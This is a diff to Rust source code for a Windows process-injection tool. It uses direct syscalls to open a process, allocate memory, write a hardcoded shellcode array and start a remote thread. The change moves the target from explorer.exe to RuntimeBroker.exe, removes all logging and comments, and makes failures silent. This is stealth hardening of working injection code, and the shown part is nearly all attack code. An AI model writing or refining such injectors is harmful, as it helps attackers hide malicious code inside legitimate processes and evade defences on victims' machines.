@@ -82,7 +82,7 @@ const SHELLCODE: [u8; 294] = [
     0x6c, 0x65, 0x73, 0x21, 0x00, 0x4a, 0x75, 0x6c, 0x65, 0x73, 0x00
 ];
 
-fn get_explorer_pid() -> Option<u32> {
+fn get_process_pid() -> Option<u32> {
     unsafe {
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
         if snapshot.is_invalid() {
@@ -97,7 +97,7 @@ fn get_explorer_pid() -> Option<u32> {
                 let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                 let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                 let process_name = String::from_utf8_lossy(bytes);
-                if process_name == "explorer.exe" {
+                if process_name == "RuntimeBroker.exe" {
                     CloseHandle(snapshot);
                     return Some(process_entry.th32ProcessID);
                 }
@@ -113,18 +113,14 @@ fn get_explorer_pid() -> Option<u32> {
 }
 
 fn main() {
-    // 1. Get explorer.exe PID
-    let explorer_pid = get_explorer_pid().expect("Failed to find explorer.exe PID.");
-    println!("Found explorer.exe PID: {}", explorer_pid);
+    let target_pid = get_process_pid().expect("Process not found");
 
-    // 2. Open a handle to the process
     let mut process_handle: HANDLE = 0;
     let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
     let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
-    client_id.UniqueProcess = explorer_pid as _;
+    client_id.UniqueProcess = target_pid as _;
 
-    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess")
-        .expect("Failed to get syscall number for NtOpenProcess");
+    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess").expect("Syscall not found");
 
     let status = unsafe {
         asm_nt_open_process(
@@ -136,16 +132,11 @@ fn main() {
         )
     };
 
-    if status != 0 {
-        panic!("NtOpenProcess failed with status: {:#x}", status);
-    }
-    println!("Successfully opened a handle to explorer.exe.");
+    if status != 0 { return; }
 
-    // 3. Allocate memory
     let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
     let mut size = SHELLCODE.len();
-    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory")
-        .expect("Failed to get syscall number for NtAllocateVirtualMemory");
+    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory").expect("Syscall not found");
 
     let status = unsafe {
         asm_nt_allocate_virtual_memory(
@@ -159,15 +150,10 @@ fn main() {
         )
     };
 
-    if status != 0 {
-        panic!("NtAllocateVirtualMemory failed with status: {:#x}", status);
-    }
-    println!("Successfully allocated memory at {:?}", alloc_addr);
+    if status != 0 { return; }
 
-    // 4. Write shellcode to the allocated memory
     let mut bytes_written = 0;
-    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory")
-        .expect("Failed to get syscall number for NtWriteVirtualMemory");
+    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");
 
     let status = unsafe {
         asm_nt_write_virtual_memory(
@@ -180,15 +166,10 @@ fn main() {
         )
     };
 
-    if status != 0 {
-        panic!("NtWriteVirtualMemory failed with status: {:#x}", status);
-    }
-    println!("Successfully wrote shellcode.");
+    if status != 0 { return; }
 
-    // 5. Create a remote thread to execute the shellcode
     let mut thread_handle: HANDLE = 0;
-    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx")
-        .expect("Failed to get syscall number for NtCreateThreadEx");
+    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx").expect("Syscall not found");
 
     let status = unsafe {
         asm_nt_create_thread_ex(
@@ -207,14 +188,9 @@ fn main() {
         )
     };
 
-    if status != 0 {
-        panic!("NtCreateThreadEx failed with status: {:#x}", status);
-    }
-    println!("Successfully created a remote thread. Check for a message box!");
+    if status != 0 { return; }
 
-    // 6. Close handles
-    let nt_close_syscall = syscall::get_syscall_number("NtClose")
-        .expect("Failed to get syscall number for NtClose");
+    let nt_close_syscall = syscall::get_syscall_number("NtClose").expect("Syscall not found");
 
     unsafe {
         asm_nt_close(thread_handle, nt_close_syscall);
